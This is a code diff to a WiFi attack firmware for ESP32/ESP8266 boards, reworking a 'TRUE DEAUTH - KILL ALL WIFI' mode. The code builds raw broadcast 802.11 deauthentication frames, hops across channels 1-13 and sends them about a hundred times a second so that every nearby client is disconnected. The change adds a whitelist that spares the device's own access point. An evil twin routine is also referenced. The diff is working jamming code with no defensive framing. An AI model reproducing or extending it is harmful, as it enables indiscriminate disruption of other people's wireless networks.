@@ -78,13 +78,29 @@ void Attack::startTrueDeauth() {
     attackTime = currentTime;
     attackStartTime = currentTime;
     
+    clearWhitelist();
+    
+    #ifdef ESP32
+    uint8_t apMac[6];
+    wifi_interface_t ifx = WIFI_IF_AP;
+    esp_wifi_get_mac(ifx, apMac);
+    addToWhitelist(apMac);
+    
+    String apMacStr = macToStr(apMac);
+    prntln("=================================");
+    prntln("TRUE DEAUTH - KILL ALL WIFI");
+    prnt("Protected AP MAC: ");
+    prntln(apMacStr.c_str());
+    prntln("Channel Hopping: 1-13");
+    prntln("=================================");
+    #else
     prntln("=================================");
     prntln("TRUE DEAUTH - KILL ALL WIFI");
     prntln("Channel Hopping: 1-13");
     prntln("Broadcasting deauth to ALL");
     prntln("=================================");
+    #endif
     
-    // Start at channel 1
     setWifiChannel(1, true);
 }
 
@@ -604,12 +620,9 @@ void Attack::evilTwinUpdate() {
 void Attack::trueDeauthUpdate() {
     if (!trueDeauth) return;
     
-    // TRUE DEAUTH - Kill ALL WiFi with channel hopping
-    // Send broadcast deauth to ALL devices on current channel
     static uint32_t lastChannelHop = 0;
     static uint8_t currentHopChannel = 1;
     
-    // Channel hopping every 200ms
     if (currentTime - lastChannelHop > 200) {
         lastChannelHop = currentTime;
         currentHopChannel++;
@@ -617,25 +630,37 @@ void Attack::trueDeauthUpdate() {
         setWifiChannel(currentHopChannel, true);
     }
     
-    // Send broadcast deauth packets continuously
     static uint32_t lastDeauth = 0;
-    if (currentTime - lastDeauth > 10) {  // ~100 packets per second
+    if (currentTime - lastDeauth > 10) {
         lastDeauth = currentTime;
         
-        // Send broadcast deauth - affects ALL clients on this channel
+        #ifdef ESP32
+        uint8_t apMac[6];
+        wifi_interface_t ifx = WIFI_IF_AP;
+        esp_wifi_get_mac(ifx, apMac);
+        
         uint8_t deauthBroadcast[26] = {
-            0xC0, 0x00,                         // Type: Deauth
-            0x00, 0x00,                         // Flags
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
-            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // Source: Fake
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: Broadcast
-            0x01, 0x00                         // Reason: Unspecified
+            0xC0, 0x00,
+            0x00, 0x00,
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+            apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+            0x01, 0x00
         };
+        #else
+        uint8_t deauthBroadcast[26] = {
+            0xC0, 0x00,
+            0x00, 0x00,
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+            0x01, 0x00
+        };
+        #endif
         
         sendPacket(deauthBroadcast, 26, currentHopChannel, true);
         deauthPkts++;
         
-        // Also send to specific targets if any
         for (int i = 0; i < apCount; i++) {
             if (accesspoints.getSelected(i)) {
                 deauthAP(i);
@@ -817,4 +842,31 @@ bool Attack::isValidating() {
 
 String Attack::getValidationResult() {
     return validationResult;
+}
+
+void Attack::addToWhitelist(uint8_t* mac) {
+    if (whitelistCount < 10) {
+        for (int i = 0; i < 6; i++) {
+            whitelist[whitelistCount][i] = mac[i];
+        }
+        whitelistCount++;
+    }
+}
+
+bool Attack::isWhitelisted(uint8_t* mac) {
+    for (int i = 0; i < whitelistCount; i++) {
+        bool match = true;
+        for (int j = 0; j < 6; j++) {
+            if (whitelist[i][j] != mac[j]) {
+                match = false;
+                break;
+            }
+        }
+        if (match) return true;
+    }
+    return false;
+}
+
+void Attack::clearWhitelist() {
+    whitelistCount = 0;
 }
